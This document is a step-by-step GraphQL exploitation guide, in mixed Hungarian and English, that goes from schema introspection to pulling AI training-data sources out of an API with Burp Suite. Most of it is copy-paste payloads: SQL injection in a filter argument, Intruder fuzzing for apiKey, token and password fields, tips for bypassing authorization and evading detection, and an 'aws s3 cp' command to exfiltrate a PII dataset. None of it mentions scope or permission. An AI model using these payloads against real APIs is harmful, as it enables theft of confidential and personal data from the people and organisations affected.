# GraphQL Query Execution Guide - From Introspection to Data Extraction

## Lépésről lépésre: Introspection → Query Execution

### 1. Amit találtál az Introspection-ben:

```json
{
  "name": "listAiDataSources",
  "description": null,
  "type": { "kind": "SCALAR" }
}
```

Ez egy **query field**, amit meg tudsz hívni!

---

## 2. Alapvető Query Hívás

### Payload 1: Egyszerű Query (No Arguments)

**Burp Repeater-be:**

```json
{
  "query": "query { listAiDataSources }"
}
```

**vagy (ha object type, nem scalar):**

```json
{
  "query": "{ listAiDataSources { id name } }"
}
```

**Várható válasz (ha sikeres):**

```json
{
  "data": {
    "listAiDataSources": [
      {
        "id": "ds-001",
        "name": "customer_data_2024"
      },
      {
        "id": "ds-002", 
        "name": "training_documents"
      }
    ]
  }
}
```

**vagy ha scalar:**

```json
{
  "data": {
    "listAiDataSources": "datasource1,datasource2,datasource3"
  }
}
```

---

## 3. Ha Nem Működik: Típus Információ Kiolvasása

### Payload 2: Részletes Típus Lekérdezés

**Burp Repeater:**

```json
{
  "query": "{ __type(name: \"Query\") { fields { name description type { name kind ofType { name kind } } args { name type { name kind } } } } }"
}
```

**Ez megmutatja:**
- `listAiDataSources` pontos return type-ját
- Milyen argumentumokat fogad el
- Milyen nested fields-ek vannak

**Példa válasz:**

```json
{
  "data": {
    "__type": {
      "fields": [
        {
          "name": "listAiDataSources",
          "description": "Returns all AI data sources",
          "type": {
            "name": null,
            "kind": "LIST",
            "ofType": {
              "name": "AiDataSource",
              "kind": "OBJECT"
            }
          },
          "args": [
            {
              "name": "filter",
              "type": {
                "name": "String",
                "kind": "SCALAR"
              }
            }
          ]
        }
      ]
    }
  }
}
```

**Most már tudod:**
- Return type: `List<AiDataSource>` (object lista)
- Van egy `filter` argument (String)

---

## 4. AiDataSource Object Fields Lekérdezése

### Payload 3: AiDataSource Type Details

```json
{
  "query": "{ __type(name: \"AiDataSource\") { fields { name type { name kind } } } }"
}
```

**Válasz:**

```json
{
  "data": {
    "__type": {
      "fields": [
        { "name": "id", "type": { "name": "ID", "kind": "SCALAR" } },
        { "name": "name", "type": { "name": "String", "kind": "SCALAR" } },
        { "name": "path", "type": { "name": "String", "kind": "SCALAR" } },
        { "name": "type", "type": { "name": "String", "kind": "SCALAR" } },
        { "name": "createdAt", "type": { "name": "String", "kind": "SCALAR" } },
        { "name": "metadata", "type": { "name": "JSON", "kind": "SCALAR" } }
      ]
    }
  }
}
```

---

## 5. Teljes Query Összeállítása

### Payload 4: Full Query with All Fields

**Most hogy tudod a fields-eket:**

```json
{
  "query": "{ listAiDataSources { id name path type createdAt metadata } }"
}
```

**Sikeres válasz:**

```json
{
  "data": {
    "listAiDataSources": [
      {
        "id": "ds-001",
        "name": "customer_conversations",
        "path": "s3://company-ai/training-data/conversations.csv",
        "type": "CSV",
        "createdAt": "2024-01-15T10:30:00Z",
        "metadata": {
          "size": "5GB",
          "recordCount": 1000000,
          "containsPII": true
        }
      },
      {
        "id": "ds-002",
        "name": "internal_documents",
        "path": "/mnt/data/internal_docs/",
        "type": "PDF",
        "createdAt": "2024-01-20T14:00:00Z",
        "metadata": {
          "fileCount": 450,
          "confidential": true
        }
      }
    ]
  }
}
```

→ **BINGO! Training data paths exposed!**

---

## 6. Ha Van Filter Argument

### Payload 5: Query with Filter

```json
{
  "query": "{ listAiDataSources(filter: \"confidential\") { id name path metadata } }"
}
```

**vagy SQL injection kísérlet:**

```json
{
  "query": "{ listAiDataSources(filter: \"' OR '1'='1\") { id name path } }"
}
```

---

## 7. Nested Objects Lekérdezése

**Ha van nested object (pl. `owner`):**

### Payload 6: Nested Fields

```json
{
  "query": "{ listAiDataSources { id name owner { id email role } files { name size url } } }"
}
```

---

## 8. Teljes Reconnaissance Flow

### Step-by-Step Burp Workflow:

#### **Step 1: Introspection (amit már csináltál)**
```json
{"query": "{ __schema { types { name } } }"}
```
→ Találtad: `listAiDataSources`

---

#### **Step 2: Query Type Details**
```json
{"query": "{ __type(name: \"Query\") { fields { name args { name } type { name kind ofType { name } } } } }"}
```
→ Megtudod: `listAiDataSources` return type és arguments

---

#### **Step 3: Return Type Details**
```json
{"query": "{ __type(name: \"AiDataSource\") { fields { name } } }"}
```
→ Megtudod: `AiDataSource` milyen fields-eket tartalmaz

---

#### **Step 4: Execute Query**
```json
{"query": "{ listAiDataSources { id name path type createdAt metadata } }"}
```
→ **EXFILTRATE DATA!**

---

## 9. Common Patterns - Copy-Paste Templates

### Template 1: List All Items
```json
{"query": "{ listAiDataSources { id name } }"}
```

### Template 2: Get Specific Item by ID
```json
{"query": "{ aiDataSource(id: \"ds-001\") { id name path metadata } }"}
```

### Template 3: With Nested Relations
```json
{"query": "{ listAiDataSources { id name owner { email } files { name url } } }"}
```

### Template 4: With Aliases (Multiple Queries)
```json
{"query": "{ ds1: listAiDataSources { name } ds2: aiDataSource(id: \"ds-001\") { path } }"}
```

---

## 10. Error Handling

### Ha Error Kapasz:

**Error 1: "Field doesn't exist"**
```json
{
  "errors": [
    {
      "message": "Cannot query field \"metadata\" on type \"AiDataSource\""
    }
  ]
}
```

**Fix:** Remove `metadata` field, try different fields.

---

**Error 2: "Must provide subselection"**
```json
{
  "errors": [
    {
      "message": "Field \"listAiDataSources\" must have a selection of subfields"
    }
  ]
}
```

**Fix:** `listAiDataSources` is an object, not scalar. Add fields:
```json
{"query": "{ listAiDataSources { id } }"}
```

---

**Error 3: "Unauthorized"**
```json
{
  "errors": [
    {
      "message": "Not authorized to access this field"
    }
  ]
}
```

**Try:**
- Add different Authorization header
- Try without auth
- Try with different user role

---

## 11. Burp Intruder Automation

### Automated Field Discovery

**Position:**
```json
{"query": "{ listAiDataSources { §FIELD§ } }"}
```

**Payload list:**
```
id
name
path
url
type
metadata
owner
createdAt
updatedAt
description
files
content
apiKey
token
secret
password
```

**Grep - Match:** `"data"`

**Result:** Discover which fields are accessible!

---

## 12. GraphQL Variables (Alternative Syntax)

**Instead of inline:**
```json
{
  "query": "{ listAiDataSources(filter: \"test\") { id } }"
}
```

**Use variables:**
```json
{
  "query": "query($filter: String) { listAiDataSources(filter: $filter) { id name path } }",
  "variables": {
    "filter": "confidential"
  }
}
```

**Advantage:** Easier to manipulate in Burp Intruder.

---

## 13. Batch Extraction

**Extract multiple data sources at once:**

```json
{
  "query": "{ ds1: aiDataSource(id: \"ds-001\") { name path } ds2: aiDataSource(id: \"ds-002\") { name path } ds3: aiDataSource(id: \"ds-003\") { name path } ds4: aiDataSource(id: \"ds-004\") { name path } ds5: aiDataSource(id: \"ds-005\") { name path } }"
}
```

---

## 14. Full Exploitation Example

### Real Attack Flow:

**1. Introspection:**
```json
{"query": "{ __schema { types { name } } }"}
```
→ Found: `AiDataSource`, `Query.listAiDataSources`

**2. Type Details:**
```json
{"query": "{ __type(name: \"AiDataSource\") { fields { name } } }"}
```
→ Fields: `id, name, path, metadata`

**3. Execute:**
```json
{"query": "{ listAiDataSources { id name path metadata } }"}
```

**4. Result:**
```json
{
  "data": {
    "listAiDataSources": [
      {
        "id": "ds-001",
        "name": "training_data",
        "path": "s3://company-ml/sensitive-data.csv",
        "metadata": {
          "pii": true,
          "records": 500000
        }
      }
    ]
  }
}
```

**5. Exfiltrate:**
```bash
# Download from S3 (if accessible)
aws s3 cp s3://company-ml/sensitive-data.csv .
```

---

## 15. Defense Detection Bypass

**If query blocked:**

### Try URL Encoding:
```
%7B%22query%22%3A%22%7B%20listAiDataSources%20%7B%20id%20%7D%20%7D%22%7D
```

### Try POST → GET:
```
GET /graphql?query={listAiDataSources{id}}
```

### Try Batching:
```json
[
  {"query": "{ __typename }"},
  {"query": "{ listAiDataSources { id } }"}
]
```

---

## Quick Reference Card

**Basic query:**
```json
{"query": "{ listAiDataSources { FIELDS_HERE } }"}
```

**With argument:**
```json
{"query": "{ listAiDataSources(filter: \"VALUE\") { FIELDS } }"}
```

**Type details:**
```json
{"query": "{ __type(name: \"AiDataSource\") { fields { name } } }"}
```

**Field discovery (Intruder):**
```json
{"query": "{ listAiDataSources { §id§ } }"}
```

**Sikeres exfiltration jele:**
- HTTP 200
- `"data"` key in response
- No `"errors"` array
- Actual data values visible

---

## Mit Keress a Response-ban:

✅ **High-value targets:**
- `path` / `url` / `filePath` - File locations
- `apiKey` / `token` / `secret` - Credentials
- `metadata` - Detailed information
- `owner` - User associations
- `content` - Actual data
- `trainingData` - ML datasets

**Copy válaszokat dokumentáláshoz!**
